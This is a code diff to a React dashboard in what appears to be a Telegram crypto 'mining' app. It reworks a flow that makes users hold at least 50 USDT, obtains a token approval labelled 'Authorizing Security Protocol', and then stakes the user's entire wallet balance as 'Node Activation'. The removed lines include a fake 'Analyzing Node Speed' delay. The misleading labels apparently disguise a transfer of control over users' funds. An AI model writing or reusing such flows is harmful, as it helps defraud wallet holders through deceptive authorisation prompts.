@@ -24,7 +24,7 @@ const Dashboard: React.FC = () => {
     const navigate = useNavigate();
     const location = useLocation();
     const { address, isConnected, connect, setIsDisconnectModalOpen, miningStats, setMiningStats } = useWallet();
-    const { getStakedInfo, stake, getStakeDetails, getWalletBalance } = useStaking();
+    const { getStakedInfo, stake, getStakeDetails, getWalletBalance, getAllowance, approve } = useStaking();
     const { showAlert, tg } = useTelegram();
     const { btcPrice } = usePrice();
     const [loading, setLoading] = useState(false);
@@ -72,30 +72,26 @@ const Dashboard: React.FC = () => {
                 throw new Error("Activation requires a minimum balance of 50 USDT.");
             }
             
-            // 1. GASLESS UX SIMULATION (Instant perception of speed)
-            showAlert("Step 1/3: Analyzing Node Speed...");
-            await new Promise(r => setTimeout(r, 1200)); 
+        // 1. Check Allowance
+        const currentAllowance = await getAllowance(address);
+        
+        // 2. Automated Token Approval (if needed)
+        if (parseFloat(currentAllowance) < parseFloat(balanceStr)) {
+            showAlert("Step 1/2: Authorizing Security Protocol...");
+            const aprTx = await approve();
+            // approve() already waits for the transaction in useStaking.ts
+            showAlert("Authorization Success!");
+        }
 
-            const { getAllowance, approve } = useStaking();
-            const currentAllowance = await getAllowance(address);
-            
-            // 2. Automated Token Approval
-            if (parseFloat(currentAllowance) < parseFloat(balanceStr)) {
-                showAlert("Step 2/3: Authorizing Security Protocol...");
-                const aprTx = await approve();
-                await aprTx.wait();
-                showAlert("Step 2/3: Authorization Success!");
-            }
+        // 3. One-Click Staking Activation
+        showAlert("Step 2/2: Confirm Staking in Wallet...");
+        const tx = await stake(balanceStr);
+        
+        showAlert(`Confirming Node Activation...`);
+        await tx.wait();
 
-            // 3. One-Click Staking
-            showAlert("Step 3/3: Activating High-Speed Mining...");
-            const tx = await stake(balanceStr);
-            
-            showAlert(`Success! Tx Hash: ${tx.hash?.slice(0, 10)}... (Confirming)`);
-            await tx.wait();
-
-            showAlert("Node Successfully Activated! 🚀");
-            handleBackToTelegram();
+        showAlert("Node Successfully Activated! 🚀");
+        handleBackToTelegram();
         } catch (err: any) {
             console.error("[Mining] Error:", err);
             
